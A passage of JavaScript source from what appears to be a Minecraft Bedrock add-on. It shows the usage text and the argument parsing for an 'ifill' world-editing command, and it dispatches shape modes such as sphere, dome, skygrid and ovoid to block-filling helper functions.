${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> clear [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> drain
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [clearContainers: boolean]`);
                    }
                    else {
                        let argsa = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsb = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "string", "presetText", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsd = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsf = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsh = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "number", "string", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsj = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsl = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsn = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        //console.warn(argsh.args)
                        let args = argsa.args;
                        let argsc = argsb.args;
                        let argse = argsd.args;
                        let argsg = argsf.args;
                        let argsi = argsh.args;
                        let argsk = argsj.args;
                        let argsm = argsl.args;
                        let argso = argsn.args;
                        let argsaextra = argsa.extra;
                        let argsbextra = argsb.extra;
                        let argsdextra = argsd.extra;
                        let argsfextra = argsf.extra;
                        let argshextra = argsh.extra;
                        let argsjextra = argsj.extra;
                        let argslextra = argsl.extra;
                        let argsnextra = argsn.extra;
                        //console.warn(JSONStringify(args), JSONStringify(argsaextra))
                        let center = evaluateCoordinates(argsc[1], argsc[2], argsc[3], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        let radius = argsc[4];
                        let axis = argsc[5];
                        let cfirstblockname = argsc[6];
                        let cfirstblockstates = argsc[7];
                        let cmode = argsc[8];
                        let clastblockname = argsc[9];
                        let clastblockstates = argsc[10];
                        let creplacemode = argsc[11] ?? false;
                        let ccfirstblockname = argse[5];
                        let ccfirstblockstates = argse[6];
                        let ccmode = argse[7];
                        let cclastblockname = argse[8];
                        let cclastblockstates = argse[9];
                        let ccreplacemode = argse[10] ?? false;
                        let thickness = argsg[5];
                        let hsfirstblockname = argsg[6];
                        let hsfirstblockstates = argsg[7];
                        let hsmode = argsg[8];
                        let hslastblockname = argsg[9];
                        let hslastblockstates = argsg[10];
                        let hsreplacemode = argsg[11] ?? false;
                        let taxis = argsi[6];
                        let tfirstblockname = argsi[7];
                        let tfirstblockstates = argsi[8];
                        let tmode = argsi[9];
                        let tlastblockname = argsi[10];
                        let tlastblockstates = argsi[11];
                        let treplacemode = argsi[12] ?? false;
                        let sgskygridsize = argso[7];
                        let sgfirstblockname = argso[8];
                        let sgfirstblockstates = argso[9];
                        let sgmode = argso[10];
                        let sglastblockname = argso[11];
                        let sglastblockstates = argso[12];
                        let sgreplacemode = argso[13] ?? false;
                        let circlemode = false;
                        new Date(Date.now()).getMilliseconds();
                        let ccirclemode = false;
                        let hspheremode = false;
                        let tunnelmode = false;
                        let ovoidmode = false;
                        let hovoidmode = false;
                        let skygridmode = false;
                        if (["circle"].includes(fillmodetypeenum[argsc[8] ?? "undefined"?.toLowerCase()?.trim()])) {
                            circlemode = true;
                        }
                        if (["circlex", "circley", "circlez", "circlexy", "circleyz", "circlexz", "circlexyz", "sphere", "semisphere"].includes(fillmodetypeenum[argse[7] ?? "undefined"?.toLowerCase()?.trim()])) {
                            ccirclemode = true;
                        }
                        if (["hollowsphere", "cylinderx", "cylindery", "cylinderz", "cylinderxy", "cylinderyz", "cylinderxz", "cylinderxyz", "dome"].includes(fillmodetypeenum[argsg[8] ?? "undefined"?.toLowerCase()?.trim()])) {
                            hspheremode = true;
                        }
                        if (["tunnel", "cylinder"].includes(fillmodetypeenum[argsi[9] ?? "undefined"?.toLowerCase()?.trim()])) {
                            tunnelmode = true;
                        }
                        if (["ovoid"].includes(fillmodetypeenum[argsm[12] ?? "undefined"?.toLowerCase()?.trim()])) {
                            ovoidmode = true;
                        }
                        if (["hollowovoid"].includes(fillmodetypeenum[argsk[13] ?? "undefined"?.toLowerCase()?.trim()])) {
                            hovoidmode = true;
                        }
                        if (["skygrid", "inverseskygrid"].includes(fillmodetypeenum[argso[10] ?? "undefined"?.toLowerCase()?.trim()])) {
                            skygridmode = true;
                        }
                        let coordinatesa; /*
                        console.warn(circlemode, ccirclemode, hspheremode)*/
                        if ((!circlemode) && (!ccirclemode) && (!hspheremode) && (!tunnelmode)) {
                            coordinatesa = evaluateCoordinates(args[1], args[2], args[3], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let coordinatesb;
                        if ((!circlemode) && (!ccirclemode) && (!hspheremode) && (!tunnelmode)) {
                            coordinatesb = evaluateCoordinates(args[4], args[5], args[6], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let horadi;
                        let hooffset;
                        let hothickness = argsk[10];
                        let hofirstblockname = argsk[11];
                        let hofirstblockstates = argsk[12];
                        let homode = argsk[13];
                        let holastblockname = argsk[14];
                        let holastblockstates = argsk[15];
                        let horeplacemode = argsk[16] ?? false;
                        if ((hovoidmode)) {
                            horadi = evaluateCoordinates(argsk[4], argsk[5], argsk[6], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                            hooffset = evaluateCoordinates(argsk[7], argsk[8], argsk[9], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let oradi;
                        let ooffset;
                        let ofirstblockname = argsm[10];
                        let ofirstblockstates = argsm[11];
                        let omode = argsm[12];
                        let olastblockname = argsm[13];
                        let olastblockstates = argsm[14];
                        let oreplacemode = argsm[15] ?? false;
                        if ((ovoidmode)) {
                            oradi = evaluateCoordinates(argsm[4], argsm[5], argsm[6], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                            ooffset = evaluateCoordinates(argsm[7], argsm[8], argsm[9], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let firstblockname = args[7];
                        let firstblockstates = args[8];
                        let mode = args[9];
                        let lastblockname = args[10];
                        let lastblockstates = args[11];
                        let replacemode = args[12] ?? false;
                        let matchingblock = (lastblockname ?? "") == "" ? [undefined, undefined] : (lastblockname == "keep" || mode == "keep") ? ["air"] : [lastblockname, lastblockstates];
                        let cmatchingblock = (clastblockname ?? "") == "" ? [undefined, undefined] : (clastblockname == "keep") ? ["air"] : [clastblockname, clastblockstates];
                        let ccmatchingblock = (cclastblockname ?? "") == "" ? [undefined, undefined] : (cclastblockname == "keep") ? ["air"] : [cclastblockname, cclastblockstates];
                        let hsmatchingblock = (hslastblockname ?? "") == "" ? [undefined, undefined] : (hslastblockname == "keep") ? ["air"] : [hslastblockname, hslastblockstates];
                        let tmatchingblock = (tlastblockname ?? "") == "" ? [undefined, undefined] : (tlastblockname == "keep") ? ["air"] : [tlastblockname, tlastblockstates];
                        let omatchingblock = (olastblockname ?? "") == "" ? [undefined, undefined] : (olastblockname == "keep") ? ["air"] : [olastblockname, olastblockstates];
                        let homatchingblock = (holastblockname ?? "") == "" ? [undefined, undefined] : (holastblockname == "keep") ? ["air"] : [holastblockname, holastblockstates];
                        let sgmatchingblock = (sglastblockname ?? "") == "" ? [undefined, undefined] : (sglastblockname == "keep") ? ["air"] : [sglastblockname, sglastblockstates]; /*
                        console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                        switch (fillmodetypeenum[skygridmode ? sgmode : hovoidmode ? homode : ovoidmode ? omode : tunnelmode ? tmode : hspheremode ? hsmode : circlemode ? cmode : ccirclemode ? ccmode : mode ?? ""]) {
                            case "":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        if (replacemode) {
                                            clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                        }
                                        ;
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "replace":
                                system.run(() => {
                                    let ta;
                                    try {
                                        let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                        player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                        ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                        system.runTimeout(() => {
                                            try {
                                                let startTime = Date.now();
                                                if (replacemode) {
                                                    clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                                }
                                                ;
                                                let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                                let endTime = Date.now();
                                                player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                            }
                                            catch (e) {
                                                eventData.sender.sendMessage("§c" + e + e.stack);
                                            }
                                            finally {
                                                ta?.remove();
                                            }
                                        }, 2);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                });
                                break;
                            case "clear":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    if (replacemode) {
                                        clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                    }
                                    ;
                                    let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, "air");
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "drain":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, "air", undefined, { matchingBlock: "water" });
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "fill":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    if (replacemode) {
                                        clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                    }
                                    ;
                                    let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "keep":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: "air" });
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "walls":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHW(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "hollow":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "outline":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHO(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "pillars":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHP(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "skygrid":
                                system.run(() => { try {
                                    fillBlocksHSGG(coordinatesa, coordinatesb, sgskygridsize, player.dimension, sgfirstblockname, sgfirstblockstates, { matchingBlock: sgmatchingblock[0], matchingBlockStates: sgmatchingblock[1], minMSBetweenYields: 5000 }, undefined, sgreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "inverseskygrid":
                                system.run(() => { try {
                                    fillBlocksHISGG(coordinatesa, coordinatesb, sgskygridsize, player.dimension, sgfirstblockname, sgfirstblockstates, { matchingBlock: sgmatchingblock[0], matchingBlockStates: sgmatchingblock[1], minMSBetweenYields: 5000 }, undefined, sgreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "tunnel":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "floor":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "ceilling":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "diamond":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "hollowovoid":
                                system.run(() => { try {
                                    fillBlocksHHOG(center, vTV3(Vector.subtract(horadi, { x: -0.5, y: -0.5, z: -0.5 })), hooffset, hothickness, player.dimension, hofirstblockname, hofirstblockstates, { matchingBlock: homatchingblock[0], matchingBlockStates: homatchingblock[1], minMSBetweenYields: 5000 }, undefined, horeplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "ovoid":
                                system.run(() => { try {
                                    fillBlocksHOG(center, vTV3(Vector.subtract(oradi, { x: -0.5, y: -0.5, z: -0.5 })), ooffset, player.dimension, ofirstblockname, ofirstblockstates, { matchingBlock: omatchingblock[0], matchingBlockStates: omatchingblock[1], minMSBetweenYields: 5000 }, undefined, oreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "hollowsphere":
                                system.run(() => { try {
                                    fillBlocksHHSG(center, radius - 0.5, thickness, player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1], minMSBetweenYields: 5000 }, undefined, hsreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "dome":
                                system.run(() => { try {
                                    fillBlocksHDG(center, radius - 0.5, thickness, player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1], minMSBetweenYields: 5000 }, undefined, hsreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "sphere":
                                system.run(() => { try {
                                    fillBlocksHSG(center, radius - 0.5, player.dimension, ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1], minMSBetweenYields: 5000 }, undefined, ccreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "semisphere":
                                system.run(() => { try {
                                    fillBlocksHSSG(center, radius - 0.5, player.dimension, ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1], minMSBetweenYields: 5000 }, undefined, ccreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circle":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHC(center, radius, player.dimension, axis, cfirstblockname, cfirstblockstates, { matchingBlock: cmatchingblock[0], matchingBlockStates: cmatchingblock[1] }, undefined, creplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlex":
                                system.run(() => { try {
                                    let startTime = Date.now();
